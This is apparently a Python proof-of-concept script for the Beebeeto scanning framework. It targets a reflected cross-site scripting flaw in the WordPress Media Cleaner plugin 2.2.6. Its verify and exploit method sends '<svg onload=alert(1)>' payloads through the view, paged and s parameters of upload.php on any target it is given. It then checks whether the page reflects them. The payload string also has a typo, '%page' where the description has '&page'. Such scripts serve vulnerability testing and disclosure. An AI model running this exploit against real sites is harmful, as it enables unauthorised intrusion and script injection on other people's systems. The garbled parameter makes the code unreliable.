#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0045',
            'name': 'WordPress Media Cleaner Plugin 2.2.6 /upload.php XSS漏洞 POC',
            'author': 'Ca2fx1n',
            'create_date': '2015-03-02',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'WordPress',
            'vul_version': ['2.2.6'],
            'type': 'Cross Site Scripting',
            'tag': ['WordPress Media Cleaner插件漏洞', 'wordpress xss', '/upload.php', 'php'],
            'desc': """
                    /wordpress/wp-admin/upload.php?s=test&page=wp-media-cleaner&view={XSS}&paged={XSS}&s={XSS}
                    parameters: 'view' and 'paged' and 's' are not filtered
                    """,
            'references': ['https://www.bugscan.net/#!/x/21349',
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        payload = '/wordpress/wp-admin/upload.php?s=test%page=wp-media-cleaner&view="><svg onload=alert(1)>'
        payload += '&paged="><svg onload=alert(1)>&s="><svg onload=alert(1)>'
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*]Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if '<svg onload=alert(1)>' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())